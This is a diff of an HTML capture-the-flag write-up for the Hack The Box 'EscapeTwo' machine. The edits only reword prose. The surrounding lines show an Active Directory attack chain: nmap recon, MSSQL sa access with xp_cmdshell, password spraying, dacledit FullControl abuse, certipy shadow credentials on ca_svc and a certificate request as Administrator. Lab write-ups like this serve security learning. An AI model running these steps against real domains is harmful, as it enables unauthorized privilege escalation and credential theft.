@@ -87,7 +87,7 @@
 <section class="wp-stage" id="recon" data-stage="1">
 <div class="wp-stage-lbl">Stage 1 &middot; Recon</div>
 <h2 class="wp-stage-title">Default creds open the front door.</h2>
-<div class="wp-stage-body"><p><code>rose / [REDACTED]</code> are the provided credentials. Nmap confirms a full AD stack: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.</p>
+<div class="wp-stage-body"><p><code>rose / [REDACTED]</code> are the provided credentials. Nmap shows the AD services: DNS, Kerberos, LDAP (389/3268), SMB, RPC over HTTP, MSSQL 2019, WinRM.</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · operator@kali</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ nmap -A -T5 -oN nmap.txt 10.10.11.51 --min-rate 2000
@@ -133,7 +133,7 @@ $ <span class="hljs-built_in">cat</span> accounts/xl/sharedStrings.xml
 </div>
 
 
-<p>The most interesting leak is <span class="hl-red"><a href="mailto:sa@sequel.htb">sa@sequel.htb</a></span>, the MSSQL <code>sa</code> login.</p>
+<p>The spreadsheet also contains <span class="hl-red"><a href="mailto:sa@sequel.htb">sa@sequel.htb</a></span>, the MSSQL <code>sa</code> login.</p>
 <figure class="wp-img"><img src="/assets/img/writeups/htb-escapetwo/02-xlsx-xml.png" alt="accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb" loading="lazy"><figcaption>accounts.xlsx is just a zip — sharedStrings.xml leaks sa@sequel.htb</figcaption></figure></div>
 </section>
 
@@ -158,7 +158,7 @@ SAPWD=<span class="hljs-string">&quot;[REDACTED]&quot;</span></code></pre>
 <figure class="wp-img"><img src="/assets/img/writeups/htb-escapetwo/03-mssqlclient.png" alt="mssqlclient as sa — xp_cmdshell prints the config INI with the old sql_svc password" loading="lazy"><figcaption>mssqlclient as sa — xp_cmdshell prints the config INI with the old sql_svc password</figcaption></figure>
 
 
-<p>Not a current-password match, but the exposed <code>sql_svc</code> password is the seed for a password spray.</p>
+<p>The exposed <code>sql_svc</code> password is not current, but it can be used in a password spray.</p>
 </div>
 </section>
 
@@ -208,7 +208,7 @@ $ dacledit.py -action write -rights FullControl \
 </div>
 
 
-<p>Shadow-credential the <code>ca_svc</code> account to get its NT hash:</p>
+<p>Use shadow credentials on <code>ca_svc</code> to get its NT hash:</p>
 <div class="wp-term">
 <div class="wp-term-head"><span class="t-title">shell · ryan · certipy</span></div>
 <pre class="wp-term-body"><code class="hljs language-bash">$ certipy-ad shadow auto -u <span class="hljs-string">&#x27;ryan@sequel.htb&#x27;</span> -p <span class="hljs-string">&#x27;[REDACTED]&#x27;</span> -account ca_svc
@@ -260,7 +260,7 @@ $ certipy-ad req -u ca_svc -hashes :[ca_svc NT <span class="hljs-built_in">hash<
 
 
 
-<aside class="wp-callout wp-tip"><div class="wp-callout-head">Tip</div><div class="wp-callout-body"><p>ADCS ESC-style abuse keeps working because admins rarely audit certificate templates. If <code>certipy find --vulnerable</code> returns <em>anything</em> in a lab or pentest, expect trouble in prod too.</p>
+<aside class="wp-callout wp-tip"><div class="wp-callout-head">Tip</div><div class="wp-callout-body"><p>The certificate template lets us request a certificate as Administrator after gaining control of <code>ca_svc</code>.</p>
 </div></aside></div>
 </section>
 
